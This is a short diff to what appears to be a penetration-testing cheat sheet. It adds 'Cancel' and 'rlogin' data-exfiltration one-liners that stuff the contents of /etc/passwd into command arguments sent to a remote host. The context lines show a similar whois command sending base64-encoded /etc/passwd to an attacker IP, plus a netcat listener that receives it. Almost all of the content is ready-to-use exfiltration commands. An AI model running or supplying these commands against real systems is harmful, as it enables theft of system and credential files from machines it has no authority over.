@@ -594,6 +594,18 @@ nc -l -v -p 43 | sed "s/ //g" | base64 -d
 whois -h $attackerIP -p 43 `cat /etc/passwd | base64`
 ```
 
+### Cancel Data Exfiltration
+
+```bash
+cancel -u "$(cat /etc/passwd)" -h ip:port
+```
+
+### rlogin Data Exfiltration
+
+```bash
+rlogin -l "$(cat /etc/passwd)" -p port host
+```
+
 ### Bash Ping Sweeper
 
 ```bash
